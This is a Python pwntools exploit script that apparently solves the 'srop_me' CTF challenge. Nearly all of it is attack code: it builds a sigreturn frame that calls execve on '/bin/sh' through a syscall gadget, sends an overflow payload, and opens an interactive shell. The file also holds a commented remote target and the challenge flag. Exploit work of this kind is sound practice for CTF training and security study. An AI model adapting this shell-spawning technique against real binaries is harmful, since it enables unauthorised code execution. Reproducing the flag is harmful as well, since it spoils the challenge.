from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
e = context.binary = ELF('./srop_me')
r= e.process()

# r = remote('challs.n00bzunit3d.xyz', 38894)

syscall=0x0000000000401019
read_vuln=0x40101F
binsh=0x40200f
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh 
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload = flat(0x61,0x62,0x63)+ flat(0,read_vuln,2,3,4,5,syscall)
payload+=bytes(frame)
pause()
r.send(payload)

pause()
r.send(b"a"*15)
r.interactive()
# n00bz{SR0P_1$_s0_fun_r1ght??!}